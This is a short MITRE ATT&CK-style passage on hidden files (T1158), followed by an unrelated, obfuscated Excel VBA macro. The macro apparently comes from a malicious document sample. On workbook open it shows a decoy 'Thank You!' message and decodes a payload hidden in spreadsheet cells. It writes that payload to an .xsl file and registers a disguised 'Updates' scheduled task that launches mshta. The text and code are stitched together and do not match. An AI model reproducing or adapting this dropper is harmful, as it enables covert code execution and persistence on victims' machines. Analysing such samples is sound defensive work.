T1158.long: To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls –a for Linux and macOS).

Sub Workbook_Open()
    On Error GoTo xFormats
    xDefaultAutoFormat = 1 / 0
xFormats:
        If Err.Number <> 0 Then
            xErrorBarIncludeMinusValues = "Thank You!"
            MsgBox xErrorBarIncludeMinusValues, , "Good", Err.HelpFile, Err.HelpContext
            xDialogMyPermission = xChartInPlace()
        End If
End Sub

Function xChartInPlace()
    For Each xErrNull In ActiveWorkbook.Sheets("Sheet1").Range("AN49:BZ3545")
        If xErrNull.Value > 0 And Len(xIMEModeHangulFull) < 201 Then
            xIMEModeHangulFull = xIMEModeHangulFull & Chr(xErrNull.Value)
        ElseIf xErrNull.Value > 0 Then
            xLinkInfoPublishers = xLinkInfoPublishers & Chr(xErrNull.Value)
        End If
    Next xErrNull
    With CreateObject("Scripting.FileSystemObject")
    Set xMonthLeadingZero = .CreateTextFile(Environ("ALLUSERSPROFILE") & "\xDialogSize.xsl")
    End With
    Const xSingleQuote = 1
    Const xSizeIsWidth = 0
    Set xDRW = CreateObject("Schedule.Service")
    Call xDRW.Connect
    Set xTimeSeparator = xDRW.GetFolder("")
    Set xStack = xDRW.NewTask(0)
    Set xParamTypeDouble = xStack.RegistrationInfo
    xParamTypeDouble.Description = "Updates"
    xParamTypeDouble.Author = "The Company"
    Set xRangeAutoFormatReport4 = xStack.Principal
    xRangeAutoFormatReport4.LogonType = 3
    Set xEntireChart = xStack.Settings
    xEntireChart.Enabled = True
    xEntireChart.StartWhenAvailable = True
    xEntireChart.Hidden = False
    Set xExcel9795 = xStack.Triggers
    Set xDialogAddChartAutoformat = xExcel9795.Create(xSingleQuote)
    xTextVisualRTL = DateAdd("s", 120, Now)
    xLinkStatusSourceNotCalculated = xSinceMyLastSave(xTextVisualRTL)
    xTextVisualRTL = DateAdd("n", 5, Now)
    xPageBreakPreview = xSinceMyLastSave(xTextVisualRTL)
    xDialogAddChartAutoformat.StartBoundary = xLinkStatusSourceNotCalculated
    With xMonthLeadingZero
        .Write xLinkInfoPublishers
    End With
    xDialogAddChartAutoformat.EndBoundary = xPageBreakPreview
    xDialogAddChartAutoformat.ID = "TimeTriggerId"
    xDialogAddChartAutoformat.Enabled = True
    Set xExpression = xStack.Actions.Create(xSizeIsWidth)
    xExpression.Path = "mshta"
    xExpression.Arguments = xIMEModeHangulFull
    Call xTimeSeparator.RegisterTaskDefinition("2021 Updates", xStack, 6, , , 3)
End Function


Function xSinceMyLastSave(xEndSides)
    xTop = "0" & Second(xEndSides)
    xList3 = "0" & Minute(xEndSides)
    xCommentAndIndicator = "0" & Hour(xEndSides)
    xPrintErrorsBlank = "0" & Day(xEndSides)
    xAxis = "0" & Month(xEndSides)
    xGrowthTrend = Year(xEndSides)
    xDialogAxes = Right(xCommentAndIndicator, 2) & ":" & Right(xList3, 2) & ":" & Right(xTop, 2)
    xFillDays = xGrowthTrend & "-" & Right(xAxis, 2) & "-" & Right(xPrintErrorsBlank, 2)
    xSinceMyLastSave = xFillDays & "T" & xDialogAxes
End Function
